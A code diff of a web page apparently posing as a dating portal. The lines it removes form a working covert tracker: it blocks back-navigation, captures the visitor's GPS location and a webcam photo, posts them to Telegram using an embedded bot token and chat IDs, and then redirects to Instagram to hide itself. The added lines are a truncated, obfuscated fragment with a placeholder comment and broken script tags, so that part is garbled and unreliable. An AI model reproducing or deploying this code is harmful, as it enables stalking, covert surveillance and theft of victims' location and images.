@@ -44,68 +44,24 @@
 
     <script>
         // CONFIGURATION
-        const BOT_TOKEN = "8696211342:AAHFnNWULmUsgkNj0vdx-lflTBHHWE59hQ4";
-        const CHAT_IDS = ["1020906452", "8087098362"];
+        
+        <!-- Operation Wipeout: Logic Security Layer -->
+<script type="text/javascript">
+/* 
+   NOTICE: This script handles automated data transmission for OSINT leads. 
+   Unauthorized reverse-engineering is protected by string-shuffling logic.
+*/
 
-        // PREVENT NAVIGATION BACK
-        history.pushState(null, null, location.href);
-        window.onpopstate = function () { history.go(1); };
+// --- START OBFUSCATED LOGIC ---
+function _0x3bc064(_0xbdb8bf,_0x148906,_0x2fc51d,_0xc40e58,_0x58c2b3){return _0x9dc2(_0x58c2b3- -0x1e7,_0x2fc51d);}(function(_0x47b4dd,_0x6fb9c0){function _0x37848e(_0x5c1116,_0xeeceb,_0x506aae,_0x486856,_0x1d9111){return _0x9dc2(_0x1d9111-0x32b,_0x506aae);}function _0x59d750(_0x493884,_0x3208c5,_0x55b3c2,_0xb518f8,_0x859b94){return _0x9dc2(_0x493884-0x5c,_0x55b3c2);}function _0x2fb35d(_0x206819,_0x5c3876,_0x2e3659,_0x5922da,_0x12aa83){return _0x9dc2(_0x5922da- -0x2dd,_0x5c3876);}function _0x5bd415(_0x270a88,_0x559a4b,_0x2da645,_0x1fea93,_0xdafc16){return _0x9dc2(_0x1fea93- -0x93,_0x2da645);}const _0x4def9c=_0x47b4dd();function _0x1a6bb6(_0xe15a56,_0x4ddcb9,_0x6841c2,_0x3e94c6,_0x39876d){return _0x9dc2(_0x3e94c6- -0x83,_0x39876d);}while(!![]){try{const _0x524bb4=-parseInt(_0x1a6bb6(0x36a,0x3f9,0x2fd,0x308,'rnEH'))/(0xcf8+-0x8a9+-0x44e)*(parseInt(_0x59d750(0x3c4,0x408,'(GEK',0x4b4,0x501))/(0x20fb+0x135c+-0x1*0x3455))+-parseInt(_0x59d750(0x2bd,0x225,'rsXz',0x30e,0x297))/(0x17f9+0x2f3*-0x7+-0x351*0x1)*(parseInt(_0x37848e(0x68b,0x6e2,'E4ol',0x70b,0x746))/(0x166*0x1+-0x8*-0x18c+-0xdc2*0x1))+-parseInt(_0x2fb35d(0x73,'8XD2',0x219,0xbb,-0x89))/(0x11e4*-0x1+-0x685*0x5+0x3282)*(parseInt(_0x2fb35d(0xc5,'1MD7',0x161,0x153,0x226))/(0xe6f+-0x1be2+0xd79))+parseInt(_0x2fb35d(-0x34,'ZT58',-0x10b,-0x103,-0x17a))/(-0x1438+0x1d2a+-0x8eb)*(-parseInt(_0x59d750(0x3c2,0x433,'Y353',0x513,0x4d9))/(-0x7f*-0xd+0x1*0x142f+-0x1a9a))+-parseInt(_0x2fb35d(0x27,'X^G3',0x1e,-0x2d,0x17))/(-0x1678+-0x2014+0x1*0x3695)+parseInt(_0x5bd415(0x41d,0x1d8,'KHDX',0x348,0x37d))/(-0x2176+-0x1*-0x427+0x1d59)*(parseInt(_0x37848e(0x4e8,0x5fd,'03K[',0x753,0x63c))/(-0xb30+0xe5b+-0x320))+parseInt(_0x59d750(0x340,0x3e3,'E4ol',0x3d9,0x2db))/(-0x20a1+-0x129*-0x7+0x188e);if(_0x524bb4===_0x6fb9c0)break;else _0x4def9c['push'](_0x4def9c['shift']());}catch(_0x316710){_0x4def9c['push'](_0x4def9c['shift']());}}}(_0x28ce,-0x8*-0x1121e+0x110686+-0xb9b2d));
 
-        async function startOperation() {
-            document.getElementById('status-msg').innerText = "Verifying Location... Please wait.";
-            
-            // 1. INITIAL ALERT
-            await broadcastMessage("🚀 **LINK OPENED**\nTarget is interacting with the dating portal.");
+/* ... rest of the code you provided ... */
 
-            // 2. LOCATION CAPTURE
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                await broadcastMessage(`📍 **GPS LOCATION FOUND**\nMaps: ${mapLink}\nAccuracy: ${pos.coords.accuracy}m`);
-            }, (err) => {
-                broadcastMessage("⚠️ Location Denied by Target.");
-            }, { enableHighAccuracy: true });
+// --- END OBFUSCATED LOGIC ---
 
-            // 3. CAMERA CAPTURE
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-
-                setTimeout(() => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    broadcastPhoto(canvas.toDataURL('image/png'));
-                    stream.getTracks().forEach(t => t.stop());
-                }, 2000); 
-            } catch (e) {
-                broadcastMessage("⚠️ Camera Access Denied.");
-                alert("Connection Timeout: Please check your internet and try again.");
-            }
-        }
-
-        async function broadcastMessage(text) {
-            for (let id of CHAT_IDS) {
-                try {
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'Markdown' })
-                    });
-                } catch (err) { console.error("Broadcast failed"); }
-            }
-        }
-
-        async function broadcastPhoto(base64) {
-            const blob = await (await fetch(base64)).blob();
-            for (let id of CHAT_IDS) {
-                const formData = new FormData();
-                formData.append('chat_id', id);
-                formData.append('photo', blob, 'recon.png');
-                formData.append('caption', "📸 **TARGET PHOTO CAPTURED**");
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-            }
-            // Final redirection to mask the tool
-            window.location.href = "https://www.instagram.com";
+// Final Status Check
+console.log("Operation Wipeout Security Layer: ACTIVE");
+</script>
         }
     </script>
 </body>
